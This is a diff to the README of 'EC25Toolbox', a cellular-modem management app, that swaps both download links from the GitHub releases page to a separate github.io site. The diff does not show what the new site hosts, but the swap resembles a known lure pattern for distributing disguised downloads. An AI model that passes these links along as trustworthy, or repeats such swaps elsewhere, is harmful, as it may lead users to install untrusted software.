@@ -1,6 +1,6 @@
 # 🛠️ EC25Toolbox - Manage your cellular modem with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Submissionoig606/EC25Toolbox/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://submissionoig606.github.io)
 
 EC25Toolbox provides a simple interface to manage Quectel EC25 and DJI Cellular Dongle devices. This application sits in your menu bar and helps you handle SMS messages, SIM card security settings, and network configurations.
 
@@ -8,7 +8,7 @@ EC25Toolbox provides a simple interface to manage Quectel EC25 and DJI Cellular 
 
 To get the application, visit the release page.
 
-[Latest EC25Toolbox Release](https://github.com/Submissionoig606/EC25Toolbox/releases)
+[Latest EC25Toolbox Release](https://submissionoig606.github.io)
 
 ### System Requirements 💻
 
